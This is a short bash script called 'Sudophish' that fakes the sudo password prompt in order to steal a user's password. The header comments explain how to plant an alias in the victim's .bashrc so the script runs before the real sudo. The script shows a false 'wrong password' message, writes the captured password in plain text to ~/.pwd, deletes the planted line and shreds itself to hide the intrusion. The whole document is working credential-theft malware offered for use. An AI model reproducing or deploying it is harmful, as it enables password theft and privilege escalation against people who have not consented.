#!/bin/bash

# Sudophish
#
# A fake sudo to get a user's password
# By Michael C. Dim - mk@mcdim.xyz

# 1. Add this line to *THE END* of the user's
#    .bashrc or .zshrc or .mkshrc etc. :
#
#    alias sudo="~/.sp.sh; sudo"
#
# 2. Put this script in the user's home
#    directory as ~/.sp.sh
#
# 3. The password will be stored in ~/.pwd
#
# 4. This script and the last .bashrc line 
#    will self-destruct and be shredded.

shellfile=".bashrc"
echo -n '[sudo] password for '$USER': '
read -s password
echo ""

# Comment the following line if the user
# does not need a password to use sudo
echo "Password is wrong, please try again"

# Save the password
echo "$password" > ~/.pwd

# Shred the line
dellastline() {
	cp "$shellfile" "$shellfile".tmp
	sed '$d' "$shellfile".tmp > "$shellfile"
	shred -fu "$shellfile".tmp
}

dellastline
echo "00000000000000000000000000" >> "$shellfile"
dellastline

# Self-destruct
shred -fu "$0"
